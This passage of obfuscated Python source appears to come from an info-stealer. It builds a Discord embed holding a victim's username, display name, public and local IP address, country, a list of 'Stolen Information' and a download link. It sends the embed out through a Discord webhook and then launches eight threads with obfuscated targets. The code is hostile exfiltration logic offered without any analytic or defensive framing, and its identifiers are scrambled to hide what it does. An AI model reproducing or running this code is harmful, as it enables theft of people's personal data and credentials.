Username    : {CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI}
DisplayName : {SNIMDDFAARRXYCWVXBLSCMMGQXZBCUWDWUKRLEDVGSECJRJLXNWCJMBYHYW}
Ip Public   : {HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL}
Ip Local    : {QEHZJJFZALHSGYQHDNUNFSQMCDUAWFPVOOMSTPFZGJURFVNLXRTUD}
Country     : {HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{PRJDJMLGPDOWLAPBAJSNSMIVIBDYJIASAOBHKYTQWNUBGYSAEZKH}"""
).set_footer(
    text=EVWPJGIPRPTJMCAPHCKLAFCLTEEYWGEKNYFAJJLGPTJHJGCLYSPKCQC, 
    icon_url=CREPNGVJWOMVBJIPFFVLZRBVMJKJTIQDHQMJNUZXYGKRICETYVFNGEJZBIQNZITRLWCNFSCEESJREABYKYPDDICGOW
)

try:  
    YXCRZCWGZIDGTZAXPTRHYXUEVYXDPMBIHFAPTKFWNWHPENMOCBQLCPSEEKFKOQP = discord.SyncWebhook.from_url(UGPNNDXWBLWFMCAHXQDDHQVIYLHHVKBFICGKAJHSLWOVUXGAXIA)
    YXCRZCWGZIDGTZAXPTRHYXUEVYXDPMBIHFAPTKFWNWHPENMOCBQLCPSEEKFKOQP.send(embed=embed, username=GKWMWGMNRTMNLHJXJKECQAQODFSIWYQMPHJXRBVIJYZDRIFHOUTZJPHDNCMFCEEZRODGZOUBVLUWKVIRGU, avatar_url=CREPNGVJWOMVBJIPFFVLZRBVMJKJTIQDHQMJNUZXYGKRICETYVFNGEJZBIQNZITRLWCNFSCEESJREABYKYPDDICGOW)
except: pass


try: threading.Thread(target=VETCRYBDDLVSPEPPDGYQZVJDCUWOABZVZNRTGUCPKDMPQDPHIJRTGFG).start()
except: pass
try: threading.Thread(target=KEBCQQOIMLADPUYYYYFTQHOGWRPBLJZYEIJMWTCQKXLLRHWEYQRPZVDJJAHGGWLIRBSYYLBWSFHICFAKER).start()
except: pass
try: threading.Thread(target=LVRTAFOUKOBMYLCDGJVHCUECHXGZBSZRTDHZPKZSUJPBEOFWMFWYOFXEOHOWBHTPLOWWWVMHJCXDPWYXDAXOUKINO).start()
except: pass
try: threading.Thread(target=BLEBWCMOSWIERTUJEOJKFSKELTYDDNXVMLYSEGGWUJXWDBBPVIXZCEDYFXHXTDRIKNLRYSFGCWUKZXVGWLMXPXTYVTXXT).start()
except: pass
try: threading.Thread(target=SAZXTQMJCOEPCNHXSPAJFYCYDISYCKVJPRBKRSCMTHMLODEIHAC).start()
except: pass
try: threading.Thread(target=FDOWJZEGBDLFZATKCETLOBGAMLGSGLDRSSMBIUSALTPMUAMNYZZJWSBULJLN).start()
except: pass
try: threading.Thread(target=OHPPFAGACNDCVLDCMSOKWNPXQJRREFTZAXMRRDKQQDMYQHVBWH).start()
except: pass
try: threading.Thread(target=TOHJGLIZSBWXYSTRGSODMFNINPIPUITBHPUPHMDVIOHDQUUUHUKASIFBHUWESGAYFKODIFR).start()
except: pass
